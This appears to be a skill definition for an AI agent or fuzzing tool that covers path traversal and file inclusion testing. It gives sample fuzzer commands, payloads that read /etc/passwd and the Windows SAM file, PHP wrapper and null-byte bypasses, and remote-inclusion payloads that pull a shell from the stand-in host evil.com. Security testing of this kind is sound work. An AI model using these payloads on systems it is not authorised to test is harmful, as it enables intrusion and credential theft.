---
name: path_traversal_testing
description: "Path traversal and local file inclusion vulnerability testing"
triggers:
  - path traversal
  - directory traversal
  - lfi
  - local file inclusion
  - rfi
  - remote file inclusion
  - file inclusion
  - ../../
  - etc/passwd
  - null byte
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

Path traversal testing finds vulnerabilities that allow unauthorized file system access. This includes Local File Inclusion (LFI) and Remote File Inclusion (RFI).

## Capabilities

- LFI detection (../../etc/passwd patterns)
- RFI detection (external URL loading)
- Null byte injection bypass
- Directory traversal sequences
- Path normalization bypass
- Double URL encoding
- Nested traversal sequences
- Windows vs Unix path handling

## Usage

### Basic LFI Test

```bash
slapper fuzz --target https://example.com/file?page=1 --type path-traversal
```

### With Known Path

```bash
slapper fuzz --target https://example.com/include?file= --type path-traversal
```

### Test Null Byte Injection

```bash
slapper fuzz --target https://example.com/image?img=1.jpg --type path-traversal
```

## Payloads Reference

**Linux Targets:**
```
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
/etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

**Windows Targets:**
```
..\\..\\..\\windows\\system32\\config\\sam
..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam
```

**PHP Wrappers:**
```
php://filter/convert.base64-encode/resource=index.php
expect://id
```

**Null Byte:**
```
../../etc/passwd%00
index.php%00.jpg
```

**RFI:**
```
http://evil.com/shell.txt
ftp://evil.com/shell.txt
```

## Triggers

Keywords: path traversal, directory traversal, lfi, rfi, local file inclusion, remote file inclusion, file read, file inclusion, ../, ..\, null byte, wrapper, php://, expect://

## Best Practices

1. Always try both Unix and Windows path separators
2. Use null byte injection (%00) when dealing with PHP < 5.3.5
3. Check for PHP wrapper support (php://filter)
4. Look for log injection via User-Agent or Referer
5. Test for path normalization issues (multiple ///)

## Configuration

```toml
[fuzz.path_traversal]
depth = 10
test_null_byte = true
test_windows = true
```